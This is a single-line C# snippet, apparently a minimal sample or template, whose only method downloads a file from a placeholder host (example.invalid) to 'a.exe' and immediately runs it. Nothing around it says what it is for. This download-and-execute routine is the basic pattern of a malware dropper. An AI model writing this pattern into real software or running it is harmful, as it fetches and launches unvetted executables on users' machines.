using System.Net; using System.Diagnostics; class C{void X(){new WebClient().DownloadFile("https://example.invalid/a","a.exe");Process.Start("a.exe");}}
